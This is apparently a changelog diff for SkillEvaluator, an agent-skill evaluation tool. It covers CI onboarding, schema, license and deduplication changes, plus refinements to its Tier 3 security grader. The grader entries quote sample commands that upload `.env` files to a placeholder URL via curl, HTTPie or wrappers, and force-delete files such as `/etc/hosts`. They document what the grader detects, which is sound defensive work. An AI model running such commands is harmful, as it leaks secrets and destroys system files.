@@ -4,7 +4,37 @@ All notable changes to SkillEvaluator are documented in this file.
 
 ## Unreleased
 
+### Documentation
+
+- Keep verified CI templates in the public repository and use one product
+  release for Python packages and CI downloads. Update onboarding links to
+  avoid relying on separate CI release entries.
+
 ### Added
+
+- Allow hosted CI reports and PR comments from scans called through explicitly
+  approved reusable workflow wrappers. Direct callers retain the existing setup;
+  signed evaluator identity and exact consumer workflow approvals remain required.
+
+- Include `skillevaluator ci init`, `ci status` and `ci demo` in the Python
+  package. Guided GitHub onboarding discovers skills, configures checks and
+  optional public hosted reports, and opens a reviewable setup PR. An optional
+  test PR demonstrates the results. Existing Pages sites and organization
+  action restrictions are preserved; private repositories can use checks only.
+- Add a visual CLI onboarding guide under GitHub Actions, alongside the manual
+  template path. Keep GitHub and GitLab as the two repository-integration choices.
+- Allow CI release templates to pin the reviewed report publisher separately
+  from the verified scanner workflow and image.
+- `tier3 select-decoys` selects neighboring skills from a local description-
+  embedding catalog and saves a reproducible JSON manifest with scores,
+  catalog/model identity, and content hashes. Group evaluations can opt in
+  with `skill_workspace.decoy_manifest` in `evals/config.yml`; selected content
+  is verified and shared between paired arms without selecting again.
+  Explicit helper skills and existing workspace defaults remain unchanged.
+  Selections exclude skills bundled inside the target and use portable roots
+  for the target's collection. Decoy hashes cover the staged runtime content,
+  so evaluation configs and other decoy manifests do not invalidate them.
+  Output guards protect evaluation inputs and existing non-manifest files.
 
 - In local mode (`--env-mode local`), a missing Claude Code, Codex, or OpenCode
   CLI is offered as a pinned npm install into the SkillEvaluator runtime folder;
@@ -93,6 +123,17 @@ All notable changes to SkillEvaluator are documented in this file.
   expected-case checks cover only the cases that ran, `run_config.json` records
   the selection as `case_selection`, and a run that skipped cases is reported
   as publication-incomplete in JSON, HTML, and BENCHMARK.md.
+- Tier 1 schema validation accepts a list for `metadata.domain` in `SKILL.md`
+  (for example `domain: [backend, ai-ml]`) instead of reporting a HIGH
+  `Input should be a valid string` finding that also stopped the remaining
+  schema checks for that skill. A single string is still accepted and is
+  treated as a one-entry list. The parsed value is now always a list: entries
+  are trimmed and deduplicated in order, and a missing, null, or blank value
+  becomes an empty list. Lists longer than 16 entries and non-string, blank, or
+  over-128-character entries are rejected. This adds a length limit that
+  `metadata.domain` did not have before: a single string longer than 128
+  characters, which used to pass, now fails Tier 1 with a HIGH
+  `Field 'metadata.domain'` finding.
 - `doctor` and `health-check` take `--tier 1|2|3|all`, so Tier 1 and Tier 2
   readiness can be checked before a run instead of surfacing mid-validation.
   Tier 1 reports each scanner that the `--checks` selection runs: SkillSpector,
@@ -260,6 +301,21 @@ All notable changes to SkillEvaluator are documented in this file.
 - CI quality thresholds apply to every parallel scan worker. Report overviews
   and detailed reports surface failed quality gates ahead of advisory findings,
   with links to the check that needs attention.
+- When `validate` finds an unusable Tier 3 source, the terminal and HTML
+  report now say which entries or files failed and why, instead of only
+  "Create or fix the Tier 3 source ... and rerun validation." The terminal
+  lists the errors under the Tier 3 finding when the full CLI report prints
+  (`-r cli` or `--verbose`) and otherwise in the compact Tier 3 panel. When
+  the run also writes an HTML or JSON report, the terminal shows the first
+  five and names that report for the rest; when it writes neither (for example
+  `-r cli` alone, or `--verbose` without `-r`), the terminal lists every
+  error. The HTML dashboard shows a single error in full or the error count,
+  and Full Insights lists every error under Source Validation Errors. The
+  errors come from the skill's eval files, so they are printed as plain text
+  with terminal control sequences removed. Passing checks and warnings are not
+  listed. The JSON report still carries every error under
+  `tier3.provenance.source_validation`. Validation rules, gate decisions, and
+  the finding's suggestion text are unchanged.
 - Tier 2 caps every intra-skill embedding chunk at 3,000 characters, preserves
   meaningful short tails and actual Python docstring source ranges, and avoids
   counting pieces of one original chunk as duplicates of each other. Oversized
@@ -274,6 +330,15 @@ All notable changes to SkillEvaluator are documented in this file.
   report's `llm_analysis` counts it in `clusters_refused`. Other chat-LLM
   failures still leave the scan incomplete. Raise `CONTENT_DEDUP.llm_refused`
   in a policy overlay to keep refusals blocking.
+- Tier 2 context deduplication no longer stops valid skills at the
+  `scalar_comparison_limit` work limit below its 512-chunk ceiling. The fixed
+  25,000,000 scalar-comparison budget stopped 2,048-dimensional embeddings at
+  156 chunks and 1,536-dimensional embeddings at 180. The budget is now
+  267,911,168, so embeddings of up to 2,048 dimensions reach all 512 chunks.
+  Wider embeddings have a lower effective chunk limit (418 chunks at 3,072
+  dimensions, 362 at 4,096), which the incomplete-scan error and the JSON
+  `work_limit` record now report as `effective_chunk_limit`, next to the
+  skill's own `chunk_count`.
 - Local-mode verifier uploads now copy directly to the absent destination,
   avoiding an unnecessary rollback snapshot of an empty tests directory.
   Inputs and rewritten scripts are prepared privately before publication,
@@ -363,11 +428,70 @@ All notable changes to SkillEvaluator are documented in this file.
   Static reports are accepted when a provider is available but LLM analysis
   was neither requested nor applied; availability alone is not execution.
 
+- `BENCHMARK.md` score transitions round half-up to one decimal place, keep
+  extra decimals for a score near a dimension verdict threshold so it is never
+  shown in a higher band (`49.95%`, not `50.0%`), and derive uplift from the
+  displayed scores. Whole-percent rounding of each value separately had
+  published contradictions such as `58% → 95% (+36 points)` and
+  `50% → 50% (+0 points)`. Scores outside 0–1 and invalid recorded baselines
+  are shown as `Not available` instead of being published. The public
+  benchmark gate (`scripts/ci/check_public_benchmarks.py`) now rejects a
+  Results at a Glance cell whose uplift does not equal the displayed difference
+  or whose scores are outside 0–100%; consistent whole-number cards from
+  earlier releases still pass.
+
+- Tier 3 `custom_only` runs no longer label a condition without a scoreable
+  reward, for example one whose attempts all failed, with the standard metric
+  set and `skill-evaluator-dimension-mean-v1` policy. That condition's
+  `summary.json`, the agent's recorded metrics and score policies,
+  `attempt_policy.json`, and the report's score definition now carry the
+  `custom-only` metric set and `custom-overall-v1` policy. When a Harbor job
+  never started, both conditions' persisted `summary.json` files record that
+  metric set and policy. A failed custom-only agent is therefore no longer
+  treated as a standard agent. Scores were already cleared for these
+  conditions, and observed rewards still determine their own metric set.
+
+- Tier 3 staging no longer fails with `chmod: cannot use dir_fd and
+  follow_symlinks together` when it replaces or merges into an existing
+  directory or file on Linux hosts whose glibc cannot change a mode without
+  following symlinks (glibc before 2.32, or newer glibc without `/proc`). This
+  affected, for example, `init-custom-grader` and `init-harbor-task` over an
+  existing `evals/` directory. Staging still changes modes without following
+  links where the platform supports it. Elsewhere it opens the entry without
+  following links, confirms it is the entry it checked, and changes the mode
+  through that open descriptor, so a link swapped in is refused instead of
+  followed. Only an entry that cannot be opened, such as one its owner cannot
+  read, is still changed by name, with an identity check afterwards.
+
+- Local-mode sandbox errors now include Bubblewrap's own failure line when its
+  startup probe fails, note that `pivot_root: Operation not permitted` can mean
+  an enclosing container's seccomp profile blocks Bubblewrap, and suggest
+  `SKILLEVALUATOR_LOCAL_SANDBOX=prefer` alongside `off`.
+
 - PII email scans recognize all RFC 2606 reserved domains, including their
   subdomains, mixed-case forms, trailing dots, and prose ellipses. A local-part
   boundary prevents quadratic rescanning of long excluded addresses. Ordinary
   addresses on the same line and domains that merely resemble placeholders remain detectable
   ([#244](https://github.com/NVIDIA/SkillEvaluator/issues/244)).
+- The license check now parses SPDX license expressions instead of splitting
+  them on operators. Expressions with unbalanced parentheses, such as
+  `(MIT OR Apache-2.0`, were allowed, and dangling or repeated operators were
+  only sent to review; both now fail with a HIGH
+  `unsupported_license_expression` finding. A malformed value without an
+  upper-case `AND`, `OR` or `WITH`, such as `mit or (apache-2.0`, is reviewed
+  as an unknown license name instead of being allowed, and `(MIT)` is allowed
+  as MIT. A blocked license still fails a value that does not parse, such as
+  `GPL-3.0 (or later)` or `(GPL-3.0 OR MIT`. The `+`, `-only` and `-or-later`
+  forms of blocked licenses, such as `GPL-3.0+`, `AGPL-3.0+` and
+  `LGPL-2.1-only`, and deprecated ids such as
+  `GPL-2.0-with-classpath-exception` are blocked instead of passing as unknown
+  licenses. `Apache-2.0 WITH LLVM-exception` is allowed through a
+  new `allowed_license_exceptions` list, while an unlisted exception such as
+  `Commons-Clause` still needs review. An allowed frontmatter expression that
+  leaves out the allowed license found in a LICENSE file is now a conflict, as
+  a single identifier already was. SPDX headers inside Markdown inline code or
+  table cells no longer keep the closing backtick or `|`, and a trailing `;` is
+  dropped. Names such as `MIT License` are matched as before.
 
 - A skill that exceeds a Tier 2 context-deduplication work limit (more than
   512 content chunks, too much pairwise comparison work, or an LLM-review limit:
@@ -381,6 +505,24 @@ All notable changes to SkillEvaluator are documented in this file.
   BENCHMARK.md, and a policy severity override could downgrade them into a pass
   with no duplicate analysis. Exit codes are otherwise unchanged. An execution
   error names the limit, and the JSON report records it under `work_limit`.
+
+- Tier 3 security grading no longer treats `rm -f` or `rm --force` without
+  `-r`, `-R`, or `--recursive` as a destructive command. Routine cleanup such as
+  `rm -f out.txt && python run.py` or `find . -name '*.pyc' -exec rm -f {} \;`
+  received a critical destructive-command finding and a security score of 0.0
+  in both graders, which could fail the Security dimension and the Tier 3
+  verdict. Force-only deletion keeps the finding when a target resolves under
+  `/bin`, `/boot`, `/etc`, `/home`, `/lib*`, `/root`, `/sbin`, `/usr`, or
+  `/var` (except `/var/tmp`), or under `~` or `$HOME`. Brace lists and dot
+  globs are expanded first, `find -exec rm -f {}` is checked against find's
+  start paths, and a relative target resolves against the directory that the
+  tool call's `workdir` and each earlier `cd`, `pushd`, or `popd` leave the
+  shell in, so `find / -exec rm -f {} +` and `cd /etc && rm -f hosts` keep the
+  finding while `(cd /etc && ls); rm -f out.txt` and
+  `echo 'run: cd /etc'; rm -f out.txt` do not. This resolution has a
+  per-trace work cap; past it, force-only targets keep the finding, as do
+  relative targets after one call moves through more than 32 directories.
+  Recursive deletion and `xargs rm -f` are graded as before.
 
 - Tier 3 security grading preserves ordinary nested `/tmp` cleanup, including
   child operands with trailing slashes, unless the current or an earlier
@@ -533,6 +675,16 @@ All notable changes to SkillEvaluator are documented in this file.
   image formats, files without that structure, and every other partial reason
   still leave the scan `INCOMPLETE`. SkillSpector's own High `AE1` findings for
   images it could not inspect are unchanged.
+- Tier 3 `--stop-on-pass` runs with local-mode Codex no longer fail to finalize
+  when Harbor's best-effort Codex cleanup is skipped, for example after a
+  timeout or cancellation. Merging the per-attempt jobs now omits the leftover
+  `codex-home` and `codex-secrets` directories in each trial's `agent/` or
+  `steps/<step>/agent/` directory, including steps whose names span several
+  path components, such as `phase/author`, as declared in the trial's
+  `result.json`. Their linked `auth.json` made the merge fail closed, and a
+  regular-file `auth.json` was copied into the merged job with the Codex
+  credential. Symlink and hard-link checks still apply everywhere else,
+  including to the same names at any other depth.
 - A `SKILL.md` over the recommended 5,000-token budget now gets a MEDIUM
   `quality_efficiency` finding instead of a HIGH one. The HIGH finding failed
   the quality check, and with it `validate`, `tier1`, and `quality-check`, even
@@ -548,6 +700,52 @@ All notable changes to SkillEvaluator are documented in this file.
   `SKILLSPECTOR_PROVIDER=nv_build` gets the same mapping. The key still reaches
   SkillSpector only as `OPENAI_API_KEY`, with `OPENAI_BASE_URL` set to the
   public Build endpoint.
+- Tier 3 security grading no longer reports a network-exfiltration warning,
+  which lowered the Security score to 0.5, when a command only names `curl`,
+  `wget`, or HTTPie as data: `apt-get install -y curl`, `which curl`,
+  `grep -rn http src/`, `env | grep -i http`, or a client mentioned in a shell
+  comment or here-document prose. Every client named after another command is
+  now checked with its own upload rules, as for a direct invocation, so
+  `find . -exec curl -d @{} URL \;`, `poetry run curl -T .env URL`, and
+  `find . -name wget -exec curl -d @.env URL \;` still warn, while a plain
+  request through a command that is not a runner, such as `strace -f curl URL`
+  or `find . -exec curl URL \;`, is now scored like a direct `curl URL`. A
+  mention followed by an HTTP method, an upload flag, or a `key=value` word,
+  such as `http POST` in prose, still warns.
+  A fixed set of runners that start a command in another host, container, root,
+  user, or network namespace, such as `ssh`, `docker`, `docker-compose`,
+  `kubectl`, `apptainer`, `chroot`, `systemd-nspawn`, `bwrap`, or
+  `ip netns exec`, warns on any client named after it, even one named only as
+  data, as in `docker exec app apt-get install -y curl`. That holds when the
+  runner is the command itself, including after a compound keyword, function
+  header, `case` pattern, or `coproc`, also when glued to it
+  (`while true; do ssh host curl URL; done`, `if(ssh host curl URL)`,
+  `case x in x)ssh host curl URL;; esac`), when it follows a pass-through
+  wrapper such as `strace`, `ionice`, `flock`, or `watch`, and when a function
+  that wraps it is called. A runner reached through another command, as in
+  `find . -exec ssh host curl URL \;` or
+  `git submodule foreach ssh host curl URL`, and a runner outside the set are
+  checked only with the client's upload rules.
+  Piped or redirected input stays with a text consumer such as `grep`, `awk`,
+  `sed`, or `jq`; any other command, loop, `if`, `{ ...; }` group, or function
+  body may pass it on, so `cat .env | strace -f http URL`, `< .env http URL`,
+  `sudo < .env http URL`, `2>&1 < .env http URL`,
+  `case "$1" in *) < .env http URL;; esac`, and
+  `while read -r l; do http URL; done < .env` still warn. A function that wraps
+  a client, as in `up() { curl "$@"; }; up -d @.env URL` or
+  `up(){ curl "$@"; }; up -d @.env URL`, is checked with that client's rules,
+  and a `$VAR` command word with no known value, in an action that names curl
+  or wget as a word, gets the curl and wget upload rules, as in
+  `for c in curl wget; do $c --post-file=.env -q URL; done`. A substitution any of
+  whose commands names a client or runner, such as `$(which curl)`,
+  `$(env which curl)`, `$(cd /tmp && which curl)`,
+  `$(command -v curl 2>/dev/null)`, `$(readlink -f $(which curl))`, or
+  `$(which ssh)`, and `$CURL` after a plain, `export`, `declare`, `read`, or
+  `printf -v` assignment, resolve to that command; a fallback chain such as
+  `$(command -v wget || command -v curl)` is checked once for each name. A
+  command printed by `$(echo curl -d @.env URL)` or `$(printf ...)` keeps its
+  printed arguments. Both the host checker and the bundled Harbor verifier
+  apply these rules.
 - Tier 3 plain progress output, which `--progress auto` selects for CI and
   redirected logs, now repeats its `still running` heartbeat every 60 seconds
   instead of every second, so long runs no longer add thousands of identical
@@ -564,6 +762,29 @@ All notable changes to SkillEvaluator are documented in this file.
   forwarded to SkillSpector so its own deadline can be raised as well, and the
   security result records the effective `skillspector_timeout_seconds`
   ([#155](https://github.com/NVIDIA/SkillEvaluator/issues/155)).
+- `similarity-check --catalog` and `tier2 --catalog` no longer report a skill
+  that is already in the local catalog as an `EXACT_DUPLICATE` of its own
+  entry, which failed the run. An entry is skipped as the skill's own only when
+  its content fingerprint matches, its path ends the skill's path, and more
+  than half of up to eight other catalog skills, spread evenly across the
+  catalog's path-sorted list, are present unchanged at their recorded paths
+  around it. The skip is recorded under
+  `self_matches_excluded` and `excluded_catalog_paths`. Verbatim copies and
+  same-name skills outside the catalog's tree are still reported; a copy of
+  most of the tree, such as a second checkout, counts as the same tree. An
+  edited skill whose name, description, or (with `--full-body`) `SKILL.md`
+  changed is still compared with its old entry; build the catalog from the tree
+  you screen.
+- Ctrl+C during `tier3 evaluate` now stops the run. The interrupt reached only
+  the coordinating thread, so running Harbor jobs kept going in their own
+  process groups, agents waiting for a `--max-agents` slot still started, and
+  the command appeared to hang until every job finished. Queued agents,
+  conditions, and `--stop-on-pass` attempts now never start. Each running
+  Harbor job receives SIGTERM and up to 30 seconds to stop its trial
+  environments, such as Docker containers, before its process group is
+  killed; a second Ctrl+C skips that wait, and on Windows the task tree is
+  stopped immediately. Progress shows the agents that are stopping and reports
+  the run as interrupted instead of failed unexpectedly.
 
 ### Security
 
@@ -575,6 +796,19 @@ All notable changes to SkillEvaluator are documented in this file.
   earlier sandboxed command run outside the sandbox. A `bwrap` symlink on
   `PATH` is resolved to its target before the smoke test, and the local-mode
   isolation message names that resolved path.
+
+## 0.7.2 - 2026-11-03
+
+- Add reporting to an existing single-job GitHub scan caller while preserving
+  its skill folders, thresholds, triggers and shared component. Explicit wrapper
+  delegation supports central version-tag updates and retains signed scan
+  identity and the resolved workflow commits in published receipts.
+- Support CLI setup with verified private GitHub Pages in eligible Enterprise
+  Cloud organization repositories. Publication rechecks site access and the
+  expected URL before retaining reports and before deployment. Private Pages
+  must already be configured by an administrator.
+- Publish updated onboarding templates and CLI metadata while retaining the
+  existing verified scanner workflow and immutable container image.
 
 ## 0.6.0 - 2026-10-20
 
